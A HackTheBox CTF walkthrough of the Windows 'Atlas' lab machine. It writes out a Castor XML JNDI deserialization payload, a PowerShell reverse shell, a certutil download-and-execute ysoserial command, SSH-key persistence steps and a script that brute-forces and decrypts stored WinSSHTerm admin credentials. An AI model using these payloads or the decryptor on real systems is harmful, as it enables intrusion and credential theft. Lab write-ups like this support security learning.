# Atlas - HackTheBox Writeup

**Difficulty:** Hard
**OS:** Windows
**Skills:** Java Deserialization, Castor XML Injection, .NET Reverse Engineering, Custom Crypto Decryption

---

## TL;DR

Anonymous FTP leaks a Java Spring Boot application that uses a vulnerable XML parser (Castor XML 1.4.1). We exploit `xsi:type` polymorphism to trigger JNDI injection, get a reverse shell as `john`, then find WinSSHTerm with stored encrypted administrator SSH credentials. After decompiling the .NET binary, reversing its obfuscated encryption scheme, and cracking the master password, we decrypt the admin password and SSH in as administrator.

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Key ports:
- **21** - FTP (FileZilla ftpd 1.7.2) - Anonymous login allowed
- **22** - OpenSSH for Windows 9.5
- **3389** - RDP
- **8080** - Apache Tomcat

### FTP - Anonymous Access

```bash
ftp <TARGET_IP>
# Login: anonymous / (blank)
```

Two files available:
- `atlas-pilot-1.0.0-SNAPSHOT.jar` - A Spring Boot application
- `atlas_generator.zip` - The application's source code

Download both:

```bash
get atlas-pilot-1.0.0-SNAPSHOT.jar
get atlas_generator.zip
```

### Source Code Analysis

Unzip the source and look at what we're dealing with:

```bash
unzip atlas_generator.zip
```

The interesting bits:

**`pom.xml`** reveals vulnerable dependencies:
- `castor-xml` 1.4.1 (old XML deserializer)
- `commons-beanutils` 1.9.2
- `commons-collections` 3.2.1

These are classic Java deserialization gadget libraries.

**`FileUploadController.java`** accepts XML file uploads at a POST endpoint.

**`Client.java`** uses `Unmarshaller` **without a mapping file** -- this is the vulnerability. Without a mapping file, Castor XML trusts `xsi:type` attributes in the XML, letting us instantiate arbitrary Java classes.

---

## Initial Access - Castor XML Deserialization

### The Vulnerability

Castor XML's `Unmarshaller` without a mapping file will honor `xsi:type` attributes. This means if we submit XML with something like `xsi:type="java:some.dangerous.Class"`, it'll actually instantiate that class. Since the app bundles Spring Framework, we can chain Spring beans to trigger a JNDI lookup to our attacker-controlled server.

### Building the Exploit

**Step 1: Create the malicious XML payload**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Employee id="101"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:java="http://java.sun.com">
  <name xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean">
    <target-bean-name>rmi://<YOUR_IP>:1099/exploit</target-bean-name>
    <property-path>foo</property-path>
    <bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory">
      <shareable-resource>rmi://<YOUR_IP>:1099/exploit</shareable-resource>
    </bean-factory>
  </name>
  <title>Test</title>
  <email>test@test.com</email>
  <phone>1234567890</phone>
  <profile>test</profile>
  <talent-titles>a</talent-titles>
  <talent-titles>b</talent-titles>
  <talent-titles>c</talent-titles>
  <talent-textes>x</talent-textes>
  <talent-textes>y</talent-textes>
  <talent-textes>z</talent-textes>
  <skills>test</skills>
  <education-title>test</education-title>
  <education-text>test</education-text>
</Employee>
```

The trick here: `PropertyPathFactoryBean` and `SimpleJndiBeanFactory` are Spring classes that will make an outbound RMI connection to our server when the XML is parsed.

**Step 2: Start the ysoserial JRMP listener**

This is important -- you **must** use Java 11 (not 17+) because newer Java versions block `TemplatesImpl` access which breaks the gadget chain.

First, create a PowerShell reverse shell script (`rev.ps1`):

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<YOUR_IP>",8000)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
$sendback = (iex $data 2>&1 | Out-String )
$sendback2 = $sendback + "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()}
$client.Close()
```

We need a two-stage approach because the target has strict firewall rules. Only port 8000 outbound seems to work (discovered through trial and error with certutil downloads). So our JRMP payload will use certutil to download the shell script, then execute it.

Start ysoserial JRMP listener with a certutil download + execute payload:

```bash
/usr/lib/jvm/java-11-openjdk-amd64/bin/java -cp ysoserial-all.jar \
  ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 \
  "cmd.exe /c certutil -urlcache -split -f http://<YOUR_IP>:8000/rev.ps1 C:/Users/Public/rev.ps1 && powershell.exe -ep bypass -f C:/Users/Public/rev.ps1"
```

**Step 3: Host the payload and catch the shell**

In separate terminals:

```bash
# Terminal 1: Host rev.ps1
python3 -m http.server 8000

# Terminal 2: Catch the reverse shell (after rev.ps1 is downloaded)
# Kill the HTTP server and start a netcat listener on the same port
ncat -lvnp 8000
```

**Step 4: Fire the exploit**

```bash
curl -X POST http://<TARGET_IP>:8080/upload \
  -F "file=@exploit.xml" \
  -F "submit=Upload"
```

The flow is:
1. Tomcat parses our XML with Castor
2. Castor sees `xsi:type` and instantiates Spring beans
3. Spring beans make an RMI connection to our JRMP listener
4. JRMP sends back a `CommonsBeanutils1` deserialization gadget
5. Gadget executes `cmd.exe` which downloads `rev.ps1` via certutil
6. PowerShell executes `rev.ps1` and connects back to us

We get a shell as `atlas\john`.

### User Flag

```
type C:\Users\John\Desktop\user.txt
```

> `REDACTED`

---

## Privilege Escalation

### Enumeration as John

Standard privesc checks don't give us much:
- No special privileges (`whoami /priv`)
- Not in any admin groups
- FileZilla Server running but we can't restart it (Access Denied)
- FileZilla admin interface on localhost:14148 only

### Setting Up Persistent Access

Before diving deeper, let's get proper SSH access (way more stable than a reverse shell):

```bash
# On your machine, generate a key if you don't have one
ssh-keygen -t rsa

# On the target shell
mkdir C:\Users\John\.ssh
echo "YOUR_PUBLIC_KEY" > C:\Users\John\.ssh\authorized_keys
```

Now you can SSH in directly:

```bash
ssh john@<TARGET_IP>
```

### Finding WinSSHTerm Credentials

Digging through John's files, we find WinSSHTerm (an SSH client) in the Downloads folder:

```
C:\Users\John\Downloads\WinSSHTerm\
```

The interesting files:
- `config\connections.xml` - Contains saved SSH connections
- `config\key` - Encryption key file
- `WinSSHTerm.exe` - The main binary (.NET)

**`connections.xml`** reveals a saved connection:

```xml
<WinSSHTerm Version="1" VerifyKey="j6JcY...WQ==">
  <Node Name="Admin SSH" Type="Connection"
        Username="administrator"
        Password="VmgFP/ooNadVdVQI5UmW3e5dISTQG8+fQ+wMJHtaATFI46G73XREnctiYbOdPYNR"
        Hostname="127.0.0.1" Port="22" />
</WinSSHTerm>
```

The administrator's SSH password is right there -- encrypted. Time for some reverse engineering.

### Downloading the Files

Via SFTP (since we have SSH access):

```bash
sftp john@<TARGET_IP>
get "C:/Users/John/Downloads/WinSSHTerm/config/key"
get "C:/Users/John/Downloads/WinSSHTerm/WinSSHTerm.exe"
```

### Decompiling WinSSHTerm

WinSSHTerm is a .NET application, so we can decompile it with ILSpy, dnSpy, or similar tools:

```bash
# Using ILSpy CLI or any .NET decompiler
ilspycmd WinSSHTerm.exe > winsshterm_decompiled.cs
```

### Reversing the Encryption

The decompiled code reveals a multi-layer encryption scheme. Here's what I found after digging through ~86,000 lines of decompiled code:

**Layer 1: Key File Decryption**

The key file (113 bytes) has:
- Byte 0: Version number (2)
- Bytes 1+: AES-256-CBC encrypted data

To decrypt the key file, WinSSHTerm uses:
- **PBKDF2-HMAC-SHA1** with 1012 iterations
- **Password**: `obfuscated_prefix + MasterPassword + suffix_string`
- **Salt**: Hardcoded `3bda31b7480550e3bc66046defc951a8`

The tricky part is the obfuscated prefix. The code uses a string table where every byte is XORed:

```csharp
// Static constructor - deobfuscation
for (int i = 0; i < data.Length; i++)
{
    data[i] = (byte)((uint)(data[i] ^ i) ^ 0xAA);
}
```

After applying this XOR to the embedded byte array, the prefix string resolves to a 20-character string (you'll need to extract this yourself from the binary).

The suffix string is `t57i.!gd9ößfty` (14 characters, 16 bytes in UTF-8 due to the umlauts).

**Layer 2: Extracting PasswordKey and SaltKey**

Once the key file is decrypted, the result is base64-decoded to get 64 bytes of key material. Each pair of bytes is bitwise-NOT'd and split:
- Even-indexed bytes (NOT'd) become `PasswordKey` (32 bytes)
- Odd-indexed bytes (NOT'd) become `SaltKey` (32 bytes)

**Layer 3: Decrypting the Stored Password**

The actual stored password is decrypted with:
- **PBKDF2-HMAC-SHA1** with 1012 iterations
- **Password**: `PasswordKey` (raw bytes)
- **Salt**: `SaltKey` (raw bytes)
- **AES-256-CBC** decryption
- Strip the 14-character suffix from the result

### Finding the Master Password

The master password protects the key file. In this case, it turned out to be a common password crackable with rockyou.txt. The decryption script below handles both known guesses and bruteforce:

```python
#!/usr/bin/env python3
"""Decrypt WinSSHTerm stored passwords"""
import hashlib
import base64
import sys
from Crypto.Cipher import AES

def pkcs7_unpad(data):
    pad_len = data[-1]
    if pad_len > 16 or pad_len == 0:
        return data
    if all(b == pad_len for b in data[-pad_len:]):
        return data[:-pad_len]
    return data

def derive_key_iv(password_bytes, salt_bytes, iterations=1012):
    derived = hashlib.pbkdf2_hmac('sha1', password_bytes, salt_bytes, iterations, dklen=48)
    return derived[:32], derived[32:48]

def decrypt_aes_cbc(data, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return pkcs7_unpad(cipher.decrypt(data))

def load_key_file(key_file_path, master_password=""):
    with open(key_file_path, 'rb') as f:
        key_data = f.read()
    encrypted_b64 = base64.b64encode(key_data[1:]).decode()

    prefix = "<OBFUSCATED_PREFIX>"  # Extract from binary
    suffix = "t57i.!gd9\u00f6\u00dffty"
    pbkdf2_password = (prefix + master_password + suffix).encode('utf-8')
    pbkdf2_salt = bytes.fromhex("3bda31b7480550e3bc66046defc951a8")
    key, iv = derive_key_iv(pbkdf2_password, pbkdf2_salt)
    try:
        encrypted = base64.b64decode(encrypted_b64)
        decrypted = decrypt_aes_cbc(encrypted, key, iv)
        result_str = decrypted.decode('utf-8')
        if result_str.endswith(suffix):
            result_str = result_str[:-len(suffix)]
        decoded = base64.b64decode(result_str)
        password_key = bytes([~decoded[i*2] & 0xFF for i in range(32)])
        salt_key = bytes([~decoded[i*2+1] & 0xFF for i in range(32)])
        return password_key, salt_key
    except:
        return None, None

def decrypt_password(encrypted_b64, password_key, salt_key):
    encrypted = base64.b64decode(encrypted_b64)
    key, iv = derive_key_iv(password_key, salt_key)
    decrypted = decrypt_aes_cbc(encrypted, key, iv)
    result = decrypted.decode('utf-8', errors='replace')
    suffix = "t57i.!gd9\u00f6\u00dffty"
    if result.endswith(suffix):
        result = result[:-len(suffix)]
    return result

def verify_key(verify_key_b64, password_key, salt_key):
    try:
        result = decrypt_password(verify_key_b64, password_key, salt_key)
        return result == "47f58e2a5e2418bef1865a858be8f5ef"
    except:
        return False

if __name__ == "__main__":
    key_file = "key"
    encrypted_password = "<ENCRYPTED_PASSWORD_FROM_CONNECTIONS_XML>"
    verify_key_b64 = "<VERIFY_KEY_FROM_CONNECTIONS_XML>"

    # Try bruteforce with rockyou
    with open("/usr/share/wordlists/rockyou.txt", "rb") as f:
        for i, line in enumerate(f):
            master_pw = line.strip().decode('utf-8', errors='ignore')
            pw_key, salt_key = load_key_file(key_file, master_pw)
            if pw_key and verify_key(verify_key_b64, pw_key, salt_key):
                print(f"[+] Master password: '{master_pw}'")
                password = decrypt_password(encrypted_password, pw_key, salt_key)
                print(f"[+] Administrator password: {password}")
                sys.exit(0)
            if i % 1000 == 0:
                print(f"  Tried {i}...", end='\r')
```

Running this gives us:
```
[+] Master password: 'REDACTED'
[+] Administrator password: REDACTED
```

### Root Flag

```bash
ssh administrator@<TARGET_IP>
type C:\Users\Administrator\Desktop\root.txt
```

> `REDACTED`

---

## Key Takeaways

1. **Castor XML without mapping files is dangerous** - The `xsi:type` polymorphism lets attackers instantiate arbitrary classes, similar to other Java deserialization bugs. Always use strict mapping files.

2. **Java version matters for exploitation** - Java 17+ blocks internal module access (`TemplatesImpl`), so ysoserial gadgets need Java 11. Keep older JDKs around for pentesting.

3. **Firewall evasion** - When standard reverse shell ports are blocked, test what ports the target can reach outbound. In this case, only port 8000 worked, and we had to use a two-stage payload (certutil download + execute).

4. **Stored credentials in desktop apps** - Password managers and SSH clients that store encrypted credentials locally can often be reversed. The encryption is only as strong as the master password, and the crypto constants are baked into the binary.

5. **.NET decompilation is powerful** - Tools like ILSpy produce nearly source-level output from .NET binaries, making reverse engineering straightforward even with obfuscation attempts like XOR'd string tables.

---

## Tools Used

- nmap, ftp, curl
- ysoserial (Java deserialization framework)
- Java 11 (required for gadget chain)
- ILSpy / ilspycmd (.NET decompiler)
- Python 3 + pycryptodome (custom decryption script)
- sshpass, sftp
